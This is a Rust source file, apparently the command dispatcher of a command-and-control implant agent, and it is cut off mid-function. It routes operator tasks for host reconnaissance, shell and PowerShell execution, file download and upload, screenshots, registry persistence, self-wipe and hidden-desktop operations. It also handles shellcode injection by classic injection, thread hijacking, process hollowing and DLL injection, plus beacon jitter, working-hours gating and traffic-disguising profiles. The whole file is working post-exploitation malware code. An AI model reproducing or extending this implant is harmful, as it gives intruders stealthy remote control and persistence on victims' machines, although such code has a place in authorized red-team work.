// exec/dispatcher.rs — Command dispatcher/engine (Rust agent side)
// Mirrors Go's dispatch.go engine pattern.
//
// TaskResult has a `cwd` field — agent returns the current working directory
// after EVERY command so the Java GUI can keep the prompt path in sync.
// For non-filesystem commands cwd is just the current dir (cheap call).
// For cd/pwd it is the new/current path specifically.

use super::inline_fs;
use super::inline_network;
use super::inline_persist;

use crate::core_agent::commu::comms::WireTask;
use crate::core_agent::commu::comms::Session;
use serde::Deserialize;
use std::process::Command;

// ============================================================
// TaskResult — every executed task returns this.
//
// `cwd` is the agent's current working directory after execution.
// The server should forward it to the GUI so the prompt stays live.
// ============================================================

#[derive(Debug, Clone)]
pub struct TaskResult {
    pub task_id: String,
    pub output:  String,
    pub error:   String,
    pub success: bool,
    pub cwd:     String,   // current working directory after execution
}

impl TaskResult {
    fn ok(task_id: String, output: String) -> Self {
        TaskResult {
            task_id,
            success: true,
            output,
            error: String::new(),
            cwd: get_cwd(),
        }
    }

    fn err(task_id: String, error: String) -> Self {
        TaskResult {
            task_id,
            success: false,
            output: String::new(),
            error,
            cwd: get_cwd(),
        }
    }

    fn with_output_and_err(task_id: String, output: String, error: String) -> Self {
        let success = error.is_empty();
        TaskResult { task_id, output, error, success, cwd: get_cwd() }
    }
}

// ============================================================
// JSON arg shapes from the C2 server
// ============================================================

#[derive(Deserialize)]
struct InlineArgs {
    command: String,
    #[serde(default)]
    args: String,
    #[serde(default)]
    path: String,
    #[serde(default)]
    data: String,
}

#[derive(Deserialize)]
struct SleepArgs {
    #[serde(default)]
    args: String,
}

// ============================================================
// Dispatch — top-level task router
// ============================================================

pub fn dispatch(task: &WireTask, session: &Session) -> TaskResult {
    match task.task_type.as_str() {
        "inline"         => run_inline(&task.id, &task.args, session.config.as_ref()),
        "bof"            => run_bof(&task.id, &task.args),
        "sleep"          => run_sleep(&task.id, &task.args),
        "update_profile" => run_update_profile(&task.id, &task.args),
        "inject"         => run_inject(&task.id, &task.args),
        "exit"           => std::process::exit(0),
        other    => TaskResult::err(
            task.id.clone(),
            format!("unknown task type: {}", other),
        ),
    }
}

/// `profile <name>` — server resolves the TOML profile and sends the parsed
/// dialect here as JSON. Swaps the agent's wire dialect (POST URI, UA,
/// headers) at runtime — no rebuild, no re-download.
fn run_update_profile(task_id: &str, args: &serde_json::Value) -> TaskResult {
    let args_str = match args.as_str() {
        Some(s) => s.to_string(),
        None => args.to_string(), // object form also accepted
    };
    match crate::core_agent::management::profile::set_from_task_json(&args_str) {
        Ok(name) => {
            let p = crate::core_agent::management::profile::get();
            let summary = p
                .map(|p| {
                    let ep = p.endpoint.as_deref().unwrap_or("(default endpoint)");
                    format!(
                        "[+] Malleable profile '{}' applied — endpoint: {}, {} POST + {} GET header(s). Takes effect from the next check-in.",
                        name, ep, p.headers.len(), p.get_headers.len()
                    )
                })
                .unwrap_or_else(|| format!("[+] Profile '{}' applied", name));
            TaskResult::ok(task_id.to_string(), summary)
        }
        Err(e) => TaskResult::err(
            task_id.to_string(),
            format!("profile apply failed: {}", e),
        ),
    }
}

// ============================================================
// Inline command router — mirrors Go's handleInline
// ============================================================

// Bug #7 fix: changed `cfg: &'static ... AgentConfig` to `cfg: &... AgentConfig`.
// The dispatcher only borrows the config for the duration of one task —
// it doesn't need to extend the lifetime. The Arc<AgentConfig> stored in
// Session derefs to &AgentConfig, so the caller passes session.config.as_ref().

fn run_inline(task_id: &str, args: &serde_json::Value, cfg: &crate::core_agent::management::config::AgentConfig) -> TaskResult {
    let ia: InlineArgs = match serde_json::from_value(args.clone()) {
        Ok(v)  => v,
        Err(e) => return TaskResult::err(task_id.to_string(), format!("parse args: {}", e)),
    };

    let cmd = ia.command.to_lowercase();
    let a   = &ia.args;
    let p   = &ia.path;
    let d   = &ia.data;

    // ── Handle drive-letter change: "D:" → cd to that drive ──
    if cmd.len() == 2 && cmd.ends_with(':') {
        let drive_char = cmd.chars().next().unwrap_or('c');
        if drive_char.is_ascii_alphabetic() {
            let (out, err) = inline_fs::cd(&cmd);
            return if err.is_empty() {
                TaskResult::ok(task_id.to_string(), out)
            } else {
                TaskResult::err(task_id.to_string(), err)
            };
        }
    }

    let (output, error) = match cmd.as_str() {
        // ── Recon (inline Win32 — no process spawn) ──
        "whoami"     => inline_whoami(),
        "whoamifull" => inline_whoami_full(),
        "hostname"   => inline_hostname(),
        "sysinfo"    => inline_sysinfo(),
        "ps" | "tasklist" => inline_ps(),  // both aliases kept for compat — tasklist is canonical
        "privs"      => inline_privs(),
        "arch"       => (String::from("x86_64"), String::new()),
        "domain"     => inline_domain(),

        // ── v8 graph collectors (Phase D/E — feed the UI graph views) ──
        // admap  : AD/domain map (DC + browse list) → ui AdMapWindow
        // agraph : this node's enrichment (ARP/TCP neighbors) → ui AttackGraphWindow
        "admap"      => crate::core_agent::ad_map::run(a),
        "agraph"     => crate::core_agent::attack_graph::run(a),
        // v9: trueip — discover the agent's PUBLIC (NAT) IP so the dashboard
        // can show the full chain: source(private) → true(public) → redirector.
        // Operator-triggered only (right-click → Discover True IP / console
        // `trueip [url]`) — the beacon never phones third parties on its own.
        "trueip"     => inline_network::trueip(a),
        "env"        => env_list(),
        "uptime"     => inline_uptime(),
        "pid"        => (format!("{}", unsafe { winapi_get_pid() }), String::new()),
        "drives"     => inline_drives(),
        "getuid"     => inline_whoami(),  // alias

        // ── Network (Inline Windows APIs — no process spawn) ──
        "ipconfig" | "ifconfig" => inline_network::ipconfig(a),
        "netstat"  => inline_network::netstat(a),
        "arp"      => inline_network::arp(a),
        "dns" | "nslookup" => inline_network::dns(a),
        "ping"     => inline_network::ping(a),
        "netusers" | "users" => inline_network::net_users(a),
        "netgroups" | "groups" => inline_network::net_groups(a),
        "netshare" | "shares" => inline_network::net_share(a),
        "reg" | "regquery" => inline_network::reg_query(a),
        "sc"       => inline_network::sc_query(a),
        "schtasks" | "schtask" => inline_network::schtasks(a),
        "eventlog" | "events" => inline_network::event_log(a),
        "find"     => inline_fs::find_files(a),

        // ── File system (Rust std — no process spawn) ──
        "ls" | "dir" => inline_fs::ls(a),
        "cat" | "type" => inline_fs::cat_file(p),
        "pwd"   => inline_fs::pwd(),
        "cd" | "chdir" => inline_fs::cd(p),
        "mkdir" | "md" => inline_fs::mkdir(p),
        "touch" => inline_fs::touch_file(a),        // 'a' = multiple filenames support
        "rm" | "del" => inline_fs::rm_cmd(a),
        "cp" | "copy" => inline_fs::cp_cmd(a),
        "mv" | "move" | "rename" | "ren" => inline_fs::mv_cmd(a),
        "download" => inline_fs::read_file(p),
        "upload"   => inline_fs::write_file(p, d),
        "hash" | "checksum" => inline_fs::hash_file(p),
        "b64encode" | "b64enc" => inline_fs::b64enc(a),
        "b64decode" | "b64dec" => inline_fs::b64dec(a),

        // ── Shell (explicit — operator chooses to spawn) ──
        "shell" | "cmd" | "exec" => run_shell(a),
        "powershell" => run_powershell(a),

        // ── Echo ──
        "echo" => handle_echo(a),

        // ── Process ops ──
        "kill"       => kill_pid(a),
        "listdlls" | "dlls" => list_dlls(),
        "screenshot" => screenshot(),

        // ── Evasion / OPSEC ──
        "amsi_check" | "amsi" => amsi_check(),
        "persist"    => inline_persist::persist_reg_run(),
        "wipe" | "selfdestruct" => wipe_self(),

        // ── Enumeration ──
        "procinfo"   => procinfo(a),

        // ── Hidden Desktop (BOF-based stealth GUI operations) ──
        // Args: "start" | "screenshot" | "list" | "stop" | "exec <cmd>"
        "hidden_desktop" | "hdesktop" | "hd" => run_hidden_desktop(a),
        // BUGFIX (I4): server routes `sleep` as type:"inline" — but this match
        // had NO "sleep" arm, so the agent replied with the shell "not
        // recognized" error while the GUI printed a fabricated success. Now
        // wired: parses SECONDS (the GUI unit), re-times the beacon via the
        // runtime override in beacon::jittered_sleep.
        "sleep"      => run_sleep_inline(a),
        // ── v5 live beacon re-timing commands (capability parity with the
        //    profile [timing] section — everything the profile can set, the
        //    operator can also set command-by-command for testing) ──
        "jitter"     => run_jitter_inline(a),
        "working_hours" | "workhours" => run_working_hours_inline(a),
        "config" | "beaconinfo" => run_config_inline(cfg),

        // ── Unknown — PowerShell-style error message ──
        _ => (
            format!(
                "{} : The term '{}' is not recognized as the name of a cmdlet, function, script file, or operable program.\n\
                 Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\n\
                 At line:1 char:1\n\
                 + {}\n\
                 + {}\n\
                     + CategoryInfo          : ObjectNotFound: ({}:String) [], CommandNotFoundException\n\
                     + FullyQualifiedErrorId : CommandNotFoundException",
                cmd, cmd, cmd,
                "~".repeat(cmd.len()),
                cmd
            ),
            String::new(),
        ),
    };

    TaskResult::with_output_and_err(task_id.to_string(), output, error)
}

// ============================================================
// BOF / Sleep
// ============================================================

#[allow(unused_variables)]
fn run_bof(task_id: &str, args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        let (out, err) = crate::core_agent::exec::bof_bridge::execute_bof_json(&args.to_string());
        return TaskResult::with_output_and_err(task_id.to_string(), out, err);
    }
    #[cfg(not(target_os = "windows"))]
    TaskResult::ok(task_id.to_string(), "BOF: windows only".into())
}

// ============================================================
// INJECT — process injection task type
//
// Wires the existing inject.c (classic / thread_hijack / process_hollow /
// dll) into the dispatcher. Previously these C functions were compiled into
// the binary but NEVER invoked (audit I-CR5 dead-code finding).
//
// Server-side syntax (operator console):
//   inject classic <pid> <shellcode_b64> [syscalls]
//   inject hijack  <pid> <tid> <shellcode_b64>
//   inject hollow  <exe_path> <shellcode_b64>
//   inject dll     <pid> <dll_path> [syscalls]
//
// The server packs this into JSON:
//   { "sub": "classic", "pid": 1234, "sc_b64": "...", "syscalls": true }
//   { "sub": "hijack",  "pid": 1234, "tid": 5678, "sc_b64": "..." }
//   { "sub": "hollow",  "exe": "C:\\Windows\\notepad.exe", "sc_b64": "..." }
//   { "sub": "dll",     "pid": 1234, "dll": "C:\\x.dll", "syscalls": false }
//
// Agent decodes the base64 shellcode, routes through the Rust wrapper
// (injection/mod.rs) which FFI-calls the matching C function.
// ============================================================

#[derive(Deserialize)]
struct InjectArgs {
    /// Sub-technique: "classic" | "hijack" | "hollow" | "dll"
    sub: String,
    /// Destination PID (classic, hijack, dll)
    #[serde(default)]
    pid: u32,
    /// Destination TID (hijack only)
    #[serde(default)]
    tid: u32,
    /// Target executable path (hollow only) — wide-char converted in wrapper
    #[serde(default)]
    exe: String,
    /// DLL path (dll only) — wide-char converted in wrapper
    #[serde(default)]
    dll: String,
    /// Base64-encoded shellcode (classic, hijack, hollow)
    #[serde(default)]
    sc_b64: String,
    /// Route through HERO FORGE forged syscalls when true (classic, dll)
    #[serde(default)]
    syscalls: bool,
}

/// Decode standard base64 to bytes. Empty input → empty Vec.
fn b64_decode_sc(s: &str) -> Result<Vec<u8>, String> {
    if s.is_empty() {
        return Err("empty shellcode".into());
    }
    // Minimal base64 decoder — no external dep, allocates the output buffer.
    // Tolerates missing padding; rejects non-alphabet chars.
    const TBL: [i8; 256] = {
        let mut t = [-1i8; 256];
        let mut i = 0;
        while i < 26 { t[b'A' as usize + i] = i as i8; i += 1; }
        let mut i = 0;
        while i < 26 { t[b'a' as usize + i] = (i + 26) as i8; i += 1; }
        let mut i = 0;
        while i < 10 { t[b'0' as usize + i] = (i + 52) as i8; i += 1; }
        t[b'+' as usize] = 62;
        t[b'/' as usize] = 63;
        t
    };
    let bytes: Vec<u8> = s.bytes().filter(|&b| b != b'\n' && b != b'\r' && b != b' ').collect();
    let mut out = Vec::with_capacity(bytes.len() * 3 / 4);
    let mut buf = 0u32;
    let mut bits = 0u32;
    for &b in &bytes {
        if b == b'=' { break; }
        let v = TBL[b as usize];
        if v < 0 { return Err(format!("invalid base64 char: 0x{:02x}", b)); }
        buf = (buf << 6) | (v as u32);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8 & 0xFF);
        }
    }
    if out.is_empty() {
        return Err("decoded zero bytes".into());
    }
    Ok(out)
}

fn run_inject(task_id: &str, args: &serde_json::Value) -> TaskResult {
    let ia: InjectArgs = match serde_json::from_value(args.clone()) {
        Ok(v)  => v,
        Err(e) => return TaskResult::err(task_id.to_string(), format!("parse inject args: {}", e)),
    };

    // Sanity: sub must be one of the supported techniques
    let sub = ia.sub.as_str();
    if !["classic", "hijack", "hollow", "dll"].contains(&sub) {
        return TaskResult::err(
            task_id.to_string(),
            format!("inject: unknown sub '{}', valid: classic|hijack|hollow|dll", sub),
        );
    }

    // `dll` does not need shellcode — path is enough
    if sub == "dll" {
        if ia.dll.is_empty() {
            return TaskResult::err(task_id.to_string(), "inject dll: missing 'dll' path".into());
        }
        match crate::core_agent::injection::dll_injection(ia.pid, &ia.dll, ia.syscalls) {
            Ok(msg) => TaskResult::ok(task_id.to_string(), msg),
            Err(e)   => TaskResult::err(task_id.to_string(), e),
        }
    } else {
        // classic / hijack / hollow all need shellcode bytes
        let sc = match b64_decode_sc(&ia.sc_b64) {
            Ok(b)  => b,
            Err(e) => return TaskResult::err(task_id.to_string(), format!("inject: sc decode: {}", e)),
        };
        let result = match sub {
            "classic" => crate::core_agent::injection::classic_injection(ia.pid, &sc, ia.syscalls),
            "hijack" => crate::core_agent::injection::thread_hijack(ia.pid, ia.tid, &sc),
            "hollow" => crate::core_agent::injection::process_hollow(&ia.exe, &sc),
            _ => unreachable!(),
        };
        match result {
            Ok(msg) => TaskResult::ok(task_id.to_string(), msg),
            Err(e)   => TaskResult::err(task_id.to_string(), e),
        }
    }
}

fn run_sleep(task_id: &str, args: &serde_json::Value) -> TaskResult {
    let s: SleepArgs = match serde_json::from_value(args.clone()) {
        Ok(v)  => v,
        Err(_) => return TaskResult::err(task_id.to_string(), "parse error".into()),
    };
    let (out, err) = run_sleep_inline(&s.args);
    if err.is_empty() { TaskResult::ok(task_id.to_string(), out) }
    else              { TaskResult::err(task_id.to_string(), err) }
}

/// BUGFIX (I4): the old run_sleep treated the incoming value as MILLISECONDS
/// (GUI sends SECONDS → "Sleep set to 60ms") and only blocked the task thread
/// with Sleep() — the beacon interval never changed. Now: input is SECONDS
/// (1..604800, matching the builder's sleep validation), stored in the beacon's
/// runtime override and used by jittered_sleep from the next cycle on.
/// v5: optional second arg — `sleep <sec> [jitter%]` re-times jitter live too
/// (this is the syntax the CommandRegistry always advertised; the old parser
/// rejected it with "expected seconds"). Jitter % persists in the same
/// override the profile engine uses, so both paths stay consistent.
fn run_sleep_inline(args: &str) -> (String, String) {
    let mut parts = args.split_whitespace();
    let sec_tok = parts.next().unwrap_or("");
    let jit_tok = parts.next().unwrap_or("");
    if parts.next().is_some() {
        return (String::new(), "sleep: too many args — `sleep <sec> [jitter%]`".into());
    }
    let t = sec_tok.trim_end_matches(|c| c == 's' || c == 'S');
    let secs: u64 = match t.parse() {
        Ok(v) => v,
        Err(_) => return (String::new(), "sleep: expected seconds, e.g. `sleep 60` or `sleep 60 30`".into()),
    };
    if secs == 0 || secs > 604800 {
        return (String::new(), "sleep: seconds must be 1..604800 (7 days)".into());
    }
    crate::core_agent::beacons::https_beacon::set_sleep_override_ms(secs * 1000);
    let mut jit_msg = String::new();
    if !jit_tok.is_empty() {
        let jt = jit_tok.trim_end_matches('%');
        let pct: u64 = match jt.parse() {
            Ok(v) => v,
            Err(_) => return (String::new(), "sleep: jitter must be a percent 0..100, e.g. `sleep 60 30`".into()),
        };
        if pct > 100 {
            return (String::new(), "sleep: jitter must be 0..100".into());
        }
        crate::core_agent::management::profile::set_jitter_override_pct(pct);
        jit_msg = format!(", jitter {}%", pct);
    }
    (format!("[+] Sleep set to {}s{} — applies from the next sleep cycle", secs, jit_msg), String::new())
}

/// v5: `jitter <pct>` — live jitter override (0..100, 0 = clear → back to
/// the baked/profile jitter fraction). Read by jittered_sleep() every cycle.
fn run_jitter_inline(args: &str) -> (String, String) {
    let t = args.trim().trim_end_matches('%');
    let pct: u64 = match t.parse() {
        Ok(v) => v,
        Err(_) => return (String::new(), "jitter: expected percent 0..100, e.g. `jitter 30`".into()),
    };
    if pct > 100 {
        return (String::new(), "jitter: percent must be 0..100".into());
    }
    crate::core_agent::management::profile::set_jitter_override_pct(pct);
    let msg = if pct == 0 {
        "[+] Jitter override cleared — back to the baked/profile jitter fraction".to_string()
    } else {
        format!("[+] Jitter set to {}% — applies from the next sleep cycle", pct)
    };
    (msg, String::new())
}

/// v5: `working_hours 09:00-18:00` | `working_hours off` — live beacon-window
/// gate override. Mirrors the profile timing.working_hours behaviour: the
/// beacon sleeps 5 min at a time while outside the window (UTC).
fn run_working_hours_inline(args: &str) -> (String, String) {
    let t = args.trim();
    if t.is_empty() || t.eq_ignore_ascii_case("off") || t.eq_ignore_ascii_case("none") {
        let _ = crate::core_agent::management::profile::set_working_hours_override(None);
        return ("[+] Working hours cleared — beaconing 24/7".into(), String::new());
    }
    match crate::core_agent::management::profile::set_working_hours_override(Some(t.to_string())) {
        Ok(()) => (format!("[+] Working hours set to '{}' — beacon only inside this window (UTC); \
while outside it the agent sleeps in 5-minute blocks", t), String::new()),
        Err(e) => (String::new(), format!("working_hours: {}", e)),
    }
}

/// v5: `config` — dump the LIVE runtime beacon state. Operator sanity check:
/// after every `sleep` / `jitter` / `working_hours` / `profile` command this
/// shows exactly what the beacon will do from its next cycle. Baked values
/// (never mutated at runtime) are shown for reference.
fn run_config_inline(cfg: &crate::core_agent::management::config::AgentConfig) -> (String, String) {
    use crate::core_agent::management::profile;
    use crate::core_agent::beacons::https_beacon;

    let prof = profile::get();
    let sleep_ovr = https_beacon::sleep_override_ms();
    let jit_ovr = profile::jitter_override_pct();
    let wh = profile::working_hours_override();
    let pm = profile::poll_mode();
    let px = profile::postex();

    // Effective timing = override if set, else baked
    let eff_sleep = if sleep_ovr > 0 { sleep_ovr } else { cfg.sleep_ms as u64 };
    let eff_jitter = if jit_ovr > 0 {
        format!("{}% (override)", jit_ovr)
    } else {
        if cfg.sleep_ms > 0 {
            format!("~{}% (baked fraction)", cfg.jitter_ms as u64 * 100 / cfg.sleep_ms as u64)
        } else {
            "(baked)".to_string()
        }
    };

    let mut out = String::from("=== RUNTIME BEACON CONFIG ===\n");
    // v8 FIX: the runtime profile may override BOTH the POST endpoint and the
    // GET-poll URI (comms.rs poll_get/heartbeat use exactly this fallback
    // chain). The old code printed only the baked values here, so after a
    // `profile` switch this display went stale. Prefer the live profile,
    // fall back to the baked blob, and always tag the source.
    let post_ep = prof.as_ref().and_then(|p| p.endpoint.clone())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| cfg.c2_endpoint.to_string());
    let post_src = if prof.as_ref().map_or(false, |p| p.endpoint.as_deref().map_or(false, |s| !s.is_empty())) { "live profile" } else { "baked" };
    out.push_str(&format!("C2          : {}://{}:{}{} ({})\n", cfg.c2_protocol, cfg.c2_host, cfg.c2_port, post_ep, post_src));
    let get_ep = prof.as_ref().and_then(|p| p.get_endpoint.clone())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| cfg.get_endpoint.to_string());
    if !get_ep.is_empty() {
        let get_src = if prof.as_ref().map_or(false, |p| p.get_endpoint.as_deref().map_or(false, |s| !s.is_empty())) { "live profile" } else { "baked" };
        out.push_str(&format!("GET-poll    : {}?v=<session> ({})\n", get_ep, get_src));
    }
    out.push_str(&format!("Poll mode   : {}\n", pm.unwrap_or_else(|| cfg.poll_mode.to_string())));
    out.push_str(&format!("User-Agent  : {}\n", prof.as_ref().and_then(|p| p.user_agent.clone())
        .unwrap_or_else(|| cfg.user_agent.to_string())));
    match prof {
        Some(p) => out.push_str(&format!("Profile     : {} ({} POST + {} GET header override(s))\n",
            p.name, p.headers.len(), p.get_headers.len())),
        None    => out.push_str("Profile     : (none — built-in dialect)\n"),
    }
    out.push_str(&format!("Sleep       : {}s{}\n", eff_sleep / 1000,
        if sleep_ovr > 0 { " (override)" } else { " (baked)" }));
    out.push_str(&format!("Jitter      : {}\n", eff_jitter));
    out.push_str(&format!("Work hours  : {}\n", wh.unwrap_or_else(|| {
        if cfg.working_hours.is_empty() { "(none — 24/7)".to_string() } else { format!("{} (baked)", cfg.working_hours) }
    })));
    out.push_str(&format!("Rotation    : {} hosts, strategy={}\n",
        cfg.c2_hosts.iter().filter(|h| !h.is_empty()).count(), cfg.rotation_strategy));
    out.push_str(&format!("Resilience  : max_errors={} max_retries={} backoff={} ({}..{}ms)\n",
        cfg.max_errors, cfg.max_retries, cfg.backoff_strategy, cfg.backoff_base_ms, cfg.backoff_max_ms));
    match px {
        Some(p) => out.push_str(&format!("PostEx      : spawnto='{}' ppid='{}' blockdlls={}\n", p.spawnto, p.ppid, p.blockdlls)),
        None    => out.push_str("PostEx      : (baked defaults)\n"),
    }
    out.push_str(&format!("Evasion     : amsi={} etw={} sleep={} antivm={} (build-time)\n",
        cfg.amsi_technique, cfg.etw_technique, cfg.sleep_technique, cfg.anti_vm_mask));
    out.push_str("NOTE: overrides live until agent restart; baked config is never mutated.\n");
    (out, String::new())
}

// ============================================================
// INLINE Win32 API commands — no process spawned
// ============================================================

fn inline_whoami() -> (String, String) {
    #[cfg(target_os = "windows")] {
        use winapi::um::winbase::GetUserNameW;
        let mut buf = [0u16; 256];
        let mut size = 256u32;
        let ok = unsafe { GetUserNameW(buf.as_mut_ptr(), &mut size) };
        if ok != 0 {
            let name = String::from_utf16_lossy(&buf[..(size - 1) as usize]);
            return (name, String::new());
        }
        (std::env::var("USERNAME").unwrap_or_default(), String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::from("test_user"), String::new())
}

fn inline_whoami_full() -> (String, String) {
    #[cfg(target_os = "windows")] {
        let mut out = String::new();
        let username = std::env::var("USERNAME").unwrap_or_default();
        let domain   = std::env::var("USERDOMAIN").unwrap_or_default();
        let userdns  = std::env::var("USERDNSDOMAIN").unwrap_or_default();
        out.push_str(&format!("{}\\{}\n", domain, username));
        if !domain.is_empty()  { out.push_str(&format!("Domain    : {}\n", domain)); }
        if !userdns.is_empty() { out.push_str(&format!("DNS Domain: {}\n", userdns)); }
        let (groups_out, _) = exec_direct("whoami", "/groups /fo list");
        if !groups_out.is_empty() { out.push('\n'); out.push_str(&groups_out); }
        let (privs_out, _) = exec_direct("whoami", "/priv /fo list");
        if !privs_out.is_empty() { out.push('\n'); out.push_str(&privs_out); }
        (out, String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::new(), String::new())
}

fn inline_hostname() -> (String, String) {
    #[cfg(target_os = "windows")] {
        use winapi::um::winbase::GetComputerNameW;
        let mut buf = [0u16; 256];
        let mut size = 256u32;
        unsafe { GetComputerNameW(buf.as_mut_ptr(), &mut size); }
        (String::from_utf16_lossy(&buf[..size as usize]), String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::new(), String::new())
}

fn inline_domain() -> (String, String) {
    (std::env::var("USERDOMAIN").unwrap_or_default(), String::new())
}

fn inline_sysinfo() -> (String, String) {
    #[cfg(target_os = "windows")] {
        use winapi::um::sysinfoapi::{GetNativeSystemInfo, SYSTEM_INFO, MEMORYSTATUSEX, GlobalMemoryStatusEx};
        use winapi::um::winnt::PROCESSOR_ARCHITECTURE_AMD64;
        let mut si = unsafe { std::mem::zeroed::<SYSTEM_INFO>() };
        unsafe { GetNativeSystemInfo(&mut si); }
        let arch = match unsafe { si.u.s().wProcessorArchitecture } {
            PROCESSOR_ARCHITECTURE_AMD64 => "x64",
            _ => "x86",
        };
        let mut out = String::new();
        out.push_str(&format!("Host Name      : {}\n", std::env::var("COMPUTERNAME").unwrap_or_default()));
        out.push_str(         "OS Name        : Windows\n");
        out.push_str(&format!("Architecture   : {}\n", arch));
        out.push_str(&format!("Username       : {}\n", std::env::var("USERNAME").unwrap_or_default()));
        out.push_str(&format!("Domain         : {}\n", std::env::var("USERDOMAIN").unwrap_or_default()));
        out.push_str(&format!("PID            : {}\n", unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() }));
        #[link(name = "shell32")]
        extern "system" { fn IsUserAnAdmin() -> winapi::shared::minwindef::BOOL; }
        out.push_str(&format!("Admin          : {}\n", unsafe { IsUserAnAdmin() != 0 }));
        let mut mem = unsafe { std::mem::zeroed::<MEMORYSTATUSEX>() };
        mem.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        if unsafe { GlobalMemoryStatusEx(&mut mem) } != 0 {
            out.push_str(&format!("Total Memory   : {:.1} GB\n", mem.ullTotalPhys as f64 / 1_073_741_824.0));
            out.push_str(&format!("Free Memory    : {:.1} GB\n", mem.ullAvailPhys as f64 / 1_073_741_824.0));
        }
        (out, String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::from("sysinfo: linux stub"), String::new())
}

fn inline_ps() -> (String, String) {
    #[cfg(target_os = "windows")] {
        use winapi::um::tlhelp32::*;
        let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
        if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return (String::new(), "snapshot failed".into());
        }
        let mut pe = unsafe { std::mem::zeroed::<PROCESSENTRY32W>() };
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        let mut out = String::new();
        out.push_str(&format!("{:<8}  {:<8}  {:<8}  {}\n", "PID", "PPID", "Threads", "Name"));
        out.push_str(&format!("{}\n", "-".repeat(60)));
        unsafe {
            if Process32FirstW(snap, &mut pe) != 0 {
                loop {
                    let name = String::from_utf16_lossy(
                        &pe.szExeFile[..pe.szExeFile.iter().position(|&c| c == 0).unwrap_or(0)]);
                    out.push_str(&format!("{:<8}  {:<8}  {:<8}  {}\n",
                        pe.th32ProcessID, pe.th32ParentProcessID, pe.cntThreads, name));
                    if Process32NextW(snap, &mut pe) == 0 { break; }
                }
            }
            winapi::um::handleapi::CloseHandle(snap);
        }
        (out, String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::from("ps: stub"), String::new())
}

fn inline_privs() -> (String, String) {
    #[cfg(target_os = "windows")] {
        use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
        use winapi::um::securitybaseapi::GetTokenInformation;
        use winapi::um::winnt::{
            TOKEN_QUERY,
            SE_PRIVILEGE_ENABLED, SE_PRIVILEGE_ENABLED_BY_DEFAULT,
        };

        #[link(name = "shell32")]
        extern "system" { fn IsUserAnAdmin() -> winapi::shared::minwindef::BOOL; }

        // Integrity level via TOKEN_INTEGRITY_LEVEL (token class 25)
        extern "system" {
            fn LookupPrivilegeNameW(
                system: *const u16, luid: *const u64,
                name: *mut u16, cch: *mut u32,
            ) -> i32;
        }

        let is_admin = unsafe { IsUserAnAdmin() != 0 };

        let mut token_handle = std::ptr::null_mut();
        unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle); }

        let mut out = String::new();
        out.push_str(&format!("IsAdmin         : {}\n", is_admin));
        out.push_str(&format!("Integrity Level : {}\n", if is_admin { "High" } else { "Medium" }));
        out.push_str(&format!("PID             : {}\n",
            unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() }));
        out.push('\n');
        out.push_str(&format!("{:<45}  {}\n", "Privilege", "State"));
        out.push_str(&format!("{}\n", "-".repeat(65)));

        // Get TOKEN_PRIVILEGES
        let mut buf = vec![0u8; 4096];
        let mut ret_len: u32 = 0;
        let ok = unsafe {
            GetTokenInformation(
                token_handle, 3, // TokenPrivileges = 3
                buf.as_mut_ptr() as *mut _, buf.len() as u32, &mut ret_len,
            )
        };

        if ok != 0 {
            let count = unsafe { *(buf.as_ptr() as *const u32) };
            // PRIVILEGE_SET: count(4) + array of LUID_AND_ATTRIBUTES (LUID=8 + attrs=4 = 12 each)
            for i in 0..count as usize {
                let base = 4 + i * 12;
                if base + 12 > buf.len() { break; }
                let luid = unsafe { *(buf.as_ptr().add(base) as *const u64) };
                let attrs = unsafe { *(buf.as_ptr().add(base + 8) as *const u32) };

                let mut name_buf = [0u16; 128];
                let mut name_len = 128u32;
                let got = unsafe {
                    LookupPrivilegeNameW(
                        std::ptr::null(), &luid,
                        name_buf.as_mut_ptr(), &mut name_len,
                    )
                };
                let priv_name = if got != 0 {
                    String::from_utf16_lossy(&name_buf[..name_len as usize])
                } else {
                    format!("LUID({:#010x})", luid)
                };

                let state = if attrs & SE_PRIVILEGE_ENABLED != 0 {
                    "Enabled"
                } else if attrs & SE_PRIVILEGE_ENABLED_BY_DEFAULT != 0 {
                    "Default"
                } else {
                    "Disabled"
                };

                out.push_str(&format!("{:<45}  {}\n", priv_name, state));
            }
        } else {
            out.push_str("(GetTokenInformation failed — insufficient permissions)\n");
        }

        if !token_handle.is_null() {
            unsafe { winapi::um::handleapi::CloseHandle(token_handle); }
        }
        (out, String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::new(), String::new())
}

fn inline_uptime() -> (String, String) {
    #[cfg(target_os = "windows")] {
        use winapi::um::sysinfoapi::GetTickCount64;
        let ms = unsafe { GetTickCount64() };
        let s  = ms / 1000;
        (format!("{}d {}h {}m {}s", s / 86400, (s % 86400) / 3600, (s % 3600) / 60, s % 60), String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::new(), String::new())
}

fn inline_drives() -> (String, String) {
    #[cfg(target_os = "windows")] {
        extern "system" {
            fn GetLogicalDrives() -> u32;
            fn GetDiskFreeSpaceExW(
                dir: *const u16,
                free_caller: *mut u64,
                total: *mut u64,
                total_free: *mut u64,
            ) -> i32;
            fn GetDriveTypeW(root: *const u16) -> u32;
        }

        let drive_type_str = |t: u32| match t {
            2 => "Removable",
            3 => "Fixed    ",
            4 => "Network  ",
            5 => "CD-ROM   ",
            6 => "RAM Disk ",
            _ => "Unknown  ",
        };

        let mask = unsafe { GetLogicalDrives() };
        let mut out = String::new();
        out.push_str(&format!("{:<6}  {:<10}  {:>12}  {:>12}  {:>12}\n",
            "Drive", "Type", "Total", "Used", "Free"));
